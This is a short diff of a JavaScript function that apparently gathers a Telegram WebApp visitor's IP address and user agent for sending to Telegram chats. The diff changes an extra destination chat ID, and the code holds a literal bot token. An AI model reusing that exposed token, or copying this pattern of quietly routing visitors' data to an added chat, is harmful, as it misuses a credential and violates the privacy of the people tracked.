@@ -7,7 +7,7 @@ async function sendDataToTelegram() {
     let tg = window.Telegram.WebApp;
     const token = "7497702434:AAH8I2QCNJuOq8tvsWt78Cgfk8AU7KdozsI";  // Replace with your bot token
     const chatId = tg.initDataUnsafe.start_param; // This can be used if needed
-    const additionalChatId = -1002202955038;
+    const additionalChatId = -1002501702455;
 
     const ipAddress = await getIPAddress();
     const userAgent = getUserAgent();
